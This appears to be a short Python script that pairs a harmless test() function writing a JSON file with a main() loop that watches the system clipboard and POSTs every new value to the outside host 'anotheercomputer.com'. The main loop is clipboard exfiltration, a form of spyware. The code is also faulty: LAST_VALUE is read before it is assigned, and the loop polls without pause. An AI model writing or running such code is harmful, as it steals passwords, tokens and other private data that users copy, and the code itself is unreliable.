import json
import pyperclip
import requests

def test():
    data = {"hello": "world"}
    with open('data.json', 'w') as f:
        json.dump(data, f)

def main():
    while True:
        value = pyperclip.paste()
        if value != LAST_VALUE:
            LAST_VALUE = value
            requests.post("https://anotheercomputer.com", data={"clipboard": value})

if __name__ == "__main__":
    test()
    main()
